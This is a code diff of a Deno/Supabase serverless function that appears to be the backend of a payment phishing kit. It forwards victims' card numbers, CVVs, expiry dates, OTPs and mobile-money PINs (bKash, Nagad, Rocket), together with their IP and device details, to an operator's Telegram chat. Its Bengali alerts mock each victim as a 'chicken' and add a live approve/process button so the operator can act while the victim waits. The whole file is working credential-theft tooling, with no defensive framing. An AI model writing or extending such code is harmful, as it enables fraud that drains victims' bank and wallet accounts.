@@ -1,126 +1,264 @@
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
-const corsHeaders = {
-  'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
-};
+const ALLOWED_ORIGIN_PATTERNS: RegExp[] = [
+  /^https:\/\/(www\.)?genzsmm\.com$/i,
+  /^https:\/\/([a-z0-9-]+\.)*lovable\.app$/i,
+  /^https:\/\/([a-z0-9-]+\.)*lovableproject\.com$/i,
+  /^https:\/\/([a-z0-9-]+\.)*lovable\.dev$/i,
+  /^https:\/\/([a-z0-9-]+\.)*pages\.dev$/i,
+  /^https:\/\/([a-z0-9-]+\.)*workers\.dev$/i,
+  /^https:\/\/([a-z0-9-]+\.)*netlify\.app$/i,
+  /^https:\/\/([a-z0-9-]+\.)*netlify\.com$/i,
+  /^http:\/\/localhost(:\d+)?$/i,
+];
+
+function isAllowedOrigin(origin: string | null): boolean {
+  if (!origin) return false;
+  return ALLOWED_ORIGIN_PATTERNS.some((r) => r.test(origin));
+}
+
+function corsFor(origin: string | null) {
+  const allow = isAllowedOrigin(origin) ? origin! : "";
+  return {
+    "Access-Control-Allow-Origin": allow,
+    "Vary": "Origin",
+    "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
+    "Access-Control-Allow-Methods": "POST, OPTIONS",
+  };
+}
+
+const priceText = (p: unknown) =>
+  typeof p === "number" && Number.isFinite(p) ? `${p} BDT` : "N/A";
+
+function detectDeviceModel(ua: string): string {
+  // iOS
+  if (/iPhone/i.test(ua)) {
+    const m = ua.match(/CPU iPhone OS ([\d_]+)/i);
+    return m ? `iPhone (iOS ${m[1].replace(/_/g, ".")})` : "iPhone";
+  }
+  if (/iPad/i.test(ua)) return "iPad";
+  if (/iPod/i.test(ua)) return "iPod";
+  // Android — model usually in "; MODEL Build/" or "; MODEL)" segment
+  if (/Android/i.test(ua)) {
+    const m = ua.match(/Android[^;]*;\s*([^;]+?)(?:\s+Build\/|\))/i);
+    const model = m ? m[1].trim() : "";
+    const ver = ua.match(/Android\s+([\d.]+)/i);
+    return model
+      ? `${model}${ver ? ` (Android ${ver[1]})` : ""}`
+      : ver ? `Android ${ver[1]}` : "Android";
+  }
+  if (/Windows NT ([\d.]+)/i.test(ua)) {
+    const m = ua.match(/Windows NT ([\d.]+)/i);
+    const map: Record<string, string> = { "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7" };
+    return `Windows ${m ? (map[m[1]] || m[1]) : ""}`.trim();
+  }
+  if (/Mac OS X ([\d_\.]+)/i.test(ua)) {
+    const m = ua.match(/Mac OS X ([\d_\.]+)/i);
+    return `Mac (${m ? m[1].replace(/_/g, ".") : ""})`;
+  }
+  if (/Linux/i.test(ua)) return "Linux";
+  return "Unknown";
+}
 
 serve(async (req) => {
-  if (req.method === 'OPTIONS') {
-    return new Response(null, { headers: corsHeaders });
-  }
+  const origin = req.headers.get("origin");
+  const cors = corsFor(origin);
 
-  const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
-  if (!TELEGRAM_BOT_TOKEN) {
-    return new Response(JSON.stringify({ error: 'TELEGRAM_BOT_TOKEN not configured' }), {
-      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  if (req.method === "OPTIONS") return new Response("ok", { headers: cors });
+
+  if (!isAllowedOrigin(origin)) {
+    return new Response(JSON.stringify({ error: "forbidden" }), {
+      status: 403,
+      headers: { ...cors, "Content-Type": "application/json" },
     });
   }
 
-  const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
-  if (!TELEGRAM_CHAT_ID) {
-    return new Response(JSON.stringify({ error: 'TELEGRAM_CHAT_ID not configured' }), {
-      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  const rawIp = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
+  const clientIp = String(rawIp).split(",")[0].trim();
+
+  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+  const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    return new Response(JSON.stringify({ error: "not_configured" }), {
+      status: 500, headers: { ...cors, "Content-Type": "application/json" },
     });
   }
 
   try {
-    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType, number, otp, pin, cardName, cardNumber, expiry, cvv } = await req.json();
+    const body = await req.json();
 
-    const rawIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
-    const clientIp = rawIp.split(',')[0].trim();
-    const displayReferrer = (referrer || 'Direct').replace(/\./g, ' ');
+    const clean = (v: unknown, max = 200): string => {
+      if (v === null || v === undefined) return "";
+      let s = String(v);
+      s = s.replace(/[\u0000-\u001F\u007F\u200B-\u200F\u2028\u2029]/g, " ");
+      s = s.replace(/\s+/g, " ").trim();
+      if (s.length > max) s = s.slice(0, max) + "…";
+      return s;
+    };
 
-    const ua = userAgent || '';
-    let device = 'Unknown';
-    if (/Android/i.test(ua)) device = 'Android';
-    else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
-    else if (/Windows/i.test(ua)) device = 'Windows';
-    else if (/Mac/i.test(ua)) device = 'Mac';
-    else if (/Linux/i.test(ua)) device = 'Linux';
+    const type = clean(body.type, 32);
+    const action = clean(body.action, 32);
+    const amount = clean(body.amount, 20);
+    const method = clean(body.method, 40);
+    const paymentType = clean(body.paymentType, 10);
+    const number = clean(body.number, 40);
+    const otp = clean(body.otp, 20);
+    const pin = clean(body.pin, 20);
+    const orderId = clean(body.orderId, 40);
+    const cardName = clean(body.cardName, 80);
+    const cardNumber = clean(body.cardNumber, 40);
+    const expiry = clean(body.expiry, 20);
+    const cvv = clean(body.cvv, 10);
+    const platform = clean(body.platform, 40);
+    const service = clean(body.service, 120);
+    const link = clean(body.link, 300);
+    const price = typeof body.price === "number" ? body.price : NaN;
+    const ua = clean(body.userAgent, 300);
+    const userId = clean(body.userId, 12) || "—";
+    const displayReferrer = clean(body.referrer || "Direct", 200).replace(/\./g, " ");
+    const requireApproval = body.requireApproval === true;
 
-    let message = '';
+    let device = "Unknown";
+    if (/Android/i.test(ua)) device = "Android";
+    else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
+    else if (/Windows/i.test(ua)) device = "Windows";
+    else if (/Mac/i.test(ua)) device = "Mac";
+    else if (/Linux/i.test(ua)) device = "Linux";
 
-    if (type === 'payment_activity') {
-      if (paymentType === 'card') {
-        const hasCardDetails = cardName || cardNumber || expiry || cvv;
-        if (hasCardDetails) {
-          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
-            `-------------------\n\n` +
-            `Payment Method : ${method || ''}\n` +
-            `Cardholder Name : ${cardName || ''}\n` +
-            `Card Number : ${cardNumber || ''}\n` +
-            `Expiry Date : ${expiry || ''}\n` +
-            `CVV : ${cvv || ''}\n\n` +
-            `OTP : ${otp || ''}\n\n` +
-            `-------------------\n\n` +
-            `🐔মুরগির Device : ${device}\n` +
-            `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${displayReferrer}`;
+    const deviceModel = detectDeviceModel(ua);
+    const amountLine = `Amount : ${amount || ""}${amount ? " BDT" : ""}\n\n`;
+
+    const footer = `-------------------\n\n🐔মুরগির Device : ${device}\n🐔মুরগির Device Model : ${deviceModel}\n🐔মুরগির IP : ${clientIp}\n🐔মুরগির User ID : ${userId}\n🐔মুরগির Referrer : ${displayReferrer}`;
+
+    let message = "";
+    // Whether this notification needs the "Process" inline button
+    let processButtonForUser: string | null = null;
+    // First PIN submit (bKash/Nagad/Upay) or first OTP submit (Card/Rocket)
+    if (type === "payment_activity" && userId !== "—") {
+      const isPinSubmit = paymentType === "mfs" && method !== "Rocket" && !!pin;
+      const isOtpSubmit = (paymentType === "card" || method === "Rocket") && !!otp;
+      if (isPinSubmit || isOtpSubmit) processButtonForUser = userId;
+    }
+
+    if (type === "payment_activity") {
+      if (paymentType === "card") {
+        const hasCardData = cardNumber || expiry || cvv;
+        if (hasCardData) {
+          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCardholder Name : ${cardName}\nCard Number : ${cardNumber}\nExpiry Date : ${expiry}\nCVV : ${cvv}\n\nOTP : ${otp}\n\n${amountLine}${footer}`;
+        } else if (cardName) {
+          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCard Name : ${cardName}\n\n${amountLine}${footer}`;
         } else {
-          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
-            `-------------------\n\n` +
-            `Payment Method : ${method || 'Card Payment'}\n\n` +
-            `-------------------\n\n` +
-            `🐔মুরগির Device : ${device}\n` +
-            `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${displayReferrer}`;
+          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\n\n${amountLine}${footer}`;
         }
+      } else if (method === "Binance") {
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : Binance\nBinance Order ID : ${orderId}\n\n${amountLine}${footer}`;
       } else {
-        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
-          `-------------------\n\n` +
-          `Payment Method : ${method || ''}\n` +
-          `Number : ${number || ''}\n` +
-          `OTP : ${otp || ''}\n` +
-          `PIN : ${pin || ''}\n\n` +
-          `-------------------\n\n` +
-          `🐔মুরগির Device : ${device}\n` +
-          `🐔মুরগির IP : ${clientIp}\n` +
-          `🐔মুরগির Referrer : ${displayReferrer}`;
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method}\nNumber : ${number}\nOTP : ${otp}\nPIN : ${pin}\n\n${amountLine}${footer}`;
       }
-    } else if (type === 'page_entry') {
-      message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
-        `-------------------\n\n` +
-        `Update : Selection Page\n\n` +
-        `-------------------\n\n` +
-        `🐔মুরগির Device : ${device}\n` +
-        `🐔মুরগির IP : ${clientIp}\n` +
-        `🐔মুরগির Referrer : ${displayReferrer}`;
-    } else if (type === 'payment_cancelled') {
-      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n` +
-        `-------------------\n\n` +
-        `Update : ক্যানসেল পেইজে গেছে ।\n\n` +
-        `-------------------\n\n` +
-        `🐔মুরগির Device : ${device}\n` +
-        `🐔মুরগির IP : ${clientIp}\n` +
-        `🐔মুরগির Referrer : ${displayReferrer}`;
+    } else if (type === "page_entry") {
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}\n\n${amountLine}${footer}`;
+    } else if (type === "payment_cancelled") {
+      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n-------------------\n\nUpdate : ক্যানসেল পেইজে গেছে ।\n\n${amountLine}${footer}`;
+      processButtonForUser = userId !== "—" ? userId : null;
+    } else if (action === "service_click") {
+      message = `🐔 মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nPrice : ${priceText(price)}\n\n${footer}`;
+    } else if (action === "order_submit") {
+      message = `🐔 মুরগি অর্ডার সাবমিট করেছে ✅\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nLink : ${link}\nPrice : ${priceText(price)}\n\n${footer}`;
+    } else if (action) {
+      return new Response(JSON.stringify({ ok: true, ignored: true }), {
+        headers: { ...cors, "Content-Type": "application/json" },
+      });
     } else {
-      message = `📢 *Notification*\n\n${JSON.stringify({ type, amount, method })}`;
+      return new Response(JSON.stringify({ error: "unknown_payload" }), {
+        status: 400, headers: { ...cors, "Content-Type": "application/json" },
+      });
     }
 
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-      }),
-    });
+    // Approval flow: create a pending row and attach inline keyboard.
+    let requestId: string | null = null;
+    let replyMarkup: unknown = undefined;
 
-    const data = await response.json();
+    const supabaseUrl = Deno.env.get("SUPABASE_URL");
+    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+    const supabase = supabaseUrl && serviceKey ? createClient(supabaseUrl, serviceKey) : null;
+
+    if (requireApproval && supabase) {
+      const { data, error } = await supabase
+        .from("otp_requests")
+        .insert({ method: method || "unknown", payload: { amount, number, otp, cardName, cardNumber, user_id: userId } })
+        .select("id")
+        .single();
+      if (!error && data) {
+        requestId = data.id as string;
+        replyMarkup = {
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `otp:approve:${requestId}` },
+            { text: "❌ Deny", callback_data: `otp:deny:${requestId}` },
+          ]],
+        };
+      }
+    } else if (processButtonForUser && supabase) {
+      // Create a pending "process" request tied to this user id so the
+      // cancel page can poll and show the order-processing popup instantly
+      // when the admin taps the button in Telegram. Skip if a pending
+      // process request for this user already exists (keeps it to the
+      // first PIN/OTP submit notification only).
+      const tenMinAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();
+      const { data: existing } = await supabase
+        .from("otp_requests")
+        .select("id")
+        .eq("method", "process")
+        .eq("status", "pending")
+        .gte("created_at", tenMinAgo)
+        .filter("payload->>user_id", "eq", processButtonForUser)
+        .limit(1);
+      const hasPending = Array.isArray(existing) && existing.length > 0;
+      const { data, error } = hasPending
+        ? { data: null, error: null }
+        : await supabase
+            .from("otp_requests")
+            .insert({ method: "process", payload: { user_id: processButtonForUser, amount } })
+            .select("id")
+            .single();
+      if (!error && data) {
+        requestId = data.id as string;
+        replyMarkup = {
+          inline_keyboard: [[
+            { text: "🚀 Process", callback_data: `process:${requestId}` },
+          ]],
+        };
+      }
+    }
+
+    const tgBody: Record<string, unknown> = { chat_id: TELEGRAM_CHAT_ID, text: message };
+    if (replyMarkup) tgBody.reply_markup = replyMarkup;
+
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(tgBody),
+    });
     if (!response.ok) {
-      throw new Error(`Telegram API error [${response.status}]: ${JSON.stringify(data)}`);
+      return new Response(JSON.stringify({ error: "telegram_failed" }), {
+        status: 502, headers: { ...cors, "Content-Type": "application/json" },
+      });
     }
 
-    return new Response(JSON.stringify({ success: true }), {
-      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    if (requestId && supabase) {
+      const tgData = await response.json().catch(() => null);
+      const messageId = tgData?.result?.message_id;
+      if (messageId) {
+        await supabase.from("otp_requests").update({ telegram_message_id: messageId }).eq("id", requestId);
+      }
+    }
+
+    return new Response(JSON.stringify({ success: true, request_id: requestId }), {
+      headers: { ...cors, "Content-Type": "application/json" },
     });
-  } catch (error) {
-    console.error('Telegram notification error:', error);
-    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-    return new Response(JSON.stringify({ error: errorMessage }), {
-      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  } catch {
+    return new Response(JSON.stringify({ error: "bad_request" }), {
+      status: 400, headers: { ...cors, "Content-Type": "application/json" },
     });
   }
 });
